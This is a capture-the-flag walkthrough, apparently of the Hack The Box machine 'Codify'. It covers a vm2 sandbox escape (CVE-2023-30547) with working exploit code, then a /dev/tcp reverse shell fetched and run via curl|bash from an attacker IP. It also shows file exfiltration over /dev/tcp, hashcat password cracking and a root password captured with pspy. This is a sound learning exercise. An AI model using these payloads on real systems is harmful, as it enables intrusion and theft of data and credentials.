
```
nmap -sC -sV {victim ip}
```

I see ports 22, 80, and 3000 are open. When I visit port 80 I find the domain `codify.htb` and add the domain to the hosts file.

```
echo '10.10.11.239 codify.htb' | sudo tee -a /etc/hosts
```
In the directory `/editor` there is a code editor which allows us to test NodeJS code

The code editor uses the open source library `vm2`, there is a vulnerability CVE-2023-30547, where attackers can raise a host exception that is not properly sanitized in handleException() function. By doing so, the attacker can escape the sandbox environment and execute arbitrary code on the host.

If we run the following code in the editor:

```
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`

console.log(vm.run(code));
```
This executes the command `id`, which outputs:

```
uid=1001(svc) gid=1001(svc) groups=1001(svc)
```
I prepared a `rev.sh`, a reverse shell to initiate a callback to our local machine.

```
  echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > rev.sh
```
I run a web server to host the script:

```
python3 -m http.server 8081
```
And start a netcat listener:

```
nc -lnvp 4444
```

We edit the last line of the code on the web app to call the reverse shell.
```
c.constructor('return process')().mainModule.require('child_process').execSync('curl
http://10.10.14.99:8081/rev.sh|bash');
```
This gets us a shell on netcat, to get a better shell I ran `script /dev/null -c bash`.

Searching thru the web directories I found a SQLite database file in `var/www/contacts` directory. I transferred this file to my local box for more analysis.

On my local I ran, to listen:

```
nc -lnvp 2222 > tickets.db
```

Then sending the file to my local:

```
   cat tickets.db > /dev/tcp/10.10.14.99/2222
```

On my local I ran sqlite3 to analyze the file:

```
$ sqlite3 tickets.db

$ select * from users;
```
We get the user `joshua` and a hash, which I ran against hashcat to get the password `spongebob1`.

```
  hashcat --force -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

We can now ssh into `joshua` with those credentials. I found a user flag at `/home/joshua/user.txt`.

To find what files we can run as root I ran `sudo -l`, and joshua can run the file `/opt/scripts/mysql-backup.sh`. To get more analysis I ran the snooping tool `pspy64s`.

I downloaded the file locally and ran a web server in that directory:

```
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
$   python3 -m http.server 8082
```
From the victim's box I used `wget`:

```
$ wget http://10.10.14.99:8082/pspy64s
$ chmod +x pspy64s
$ ./pspy64s
```
From another shell on our victim's box, we run the file we found from running `sudo -l`:

```
sudo /opt/scripts/mysql-backup.sh
```
After watching `pspy64s` run after we executed the file I found the root password `kljh12k3jhaskjh12kjh3`.

I login and get the root flag:

```
$ su root
$ cat /root/root.txt
```













